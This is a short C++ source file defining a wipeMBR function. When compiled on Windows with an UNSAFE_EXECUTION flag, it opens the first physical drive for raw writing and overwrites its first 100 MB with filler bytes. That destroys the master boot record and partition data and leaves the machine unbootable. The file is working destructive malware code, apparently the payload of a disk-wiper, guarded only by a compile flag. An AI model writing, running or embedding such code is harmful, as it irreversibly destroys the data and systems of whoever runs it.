#include "mbr.h"

#ifdef _WIN32
#include <windows.h>
#include <iostream>
#endif

bool wipeMBR() {
#ifdef UNSAFE_EXECUTION
#ifdef _WIN32
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) {
        return false;
    }

    const DWORD BUFFER_SIZE = 64 * 1024;
    BYTE buffer[BUFFER_SIZE];
    memset(buffer, 0xCC, sizeof(buffer));

    DWORD bytesWritten;
    LARGE_INTEGER offset;
    offset.QuadPart = 0;

    const LONGLONG TOTAL_BYTES = 100LL * 1024LL * 1024LL;
    LONGLONG bytesRemaining = TOTAL_BYTES;

    while (bytesRemaining > 0) {
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

        DWORD chunk = (bytesRemaining >= BUFFER_SIZE) ? BUFFER_SIZE : (DWORD)bytesRemaining;
        BOOL res = WriteFile(hDisk, buffer, chunk, &bytesWritten, NULL);

        if (!res || bytesWritten != chunk) {
            CloseHandle(hDisk);
            return false;
        }

        offset.QuadPart += chunk;
        bytesRemaining -= chunk;
    }

    CloseHandle(hDisk);
    return true;

#else
    return false;
#endif
#else
    return false;
#endif
}
